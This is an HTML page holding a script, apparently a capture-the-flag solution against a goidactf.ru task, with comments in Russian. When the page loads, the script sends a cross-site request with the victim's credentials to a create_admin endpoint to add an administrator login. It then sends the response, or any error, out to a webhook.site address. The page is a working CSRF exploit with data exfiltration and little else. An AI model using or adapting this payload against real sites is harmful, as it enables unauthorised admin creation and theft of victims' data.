<!DOCTYPE html>
<html>
<body>
<script>
  // Отправляем POST-запрос на create_admin от имени жертвы
  fetch("https://tasks.goidactf.ru:20061/create_admin", {
  "headers": {
    "accept": "*/*",
  },
  "referrer": "https://tasks.goidactf.ru:20061/admin",
  "body": "new_admin_login=123",
  "method": "POST",
  credentials: 'include',
  "mode": "cors",
})
  .then(res => {
    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!s
    return res.text().then(body => ({
      status: res.status,
      headers: [...res.headers.entries()],
      body: body
    }));
  })
  .then(data => {
     console.log('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+ encodeURIComponent(JSON.stringify(data)))
    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+encodeURIComponent(JSON.stringify(data)), {
      method: 'GET',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' }
    });
  })
  .catch(data => {
    console.log('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+ encodeURIComponent(JSON.stringify(data)))
    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+ encodeURIComponent(JSON.stringify(data)), {
      method: 'GET',
credentials: 'include',
      headers: { 'Content-Type': 'application/json' }
    });
  })
</script>
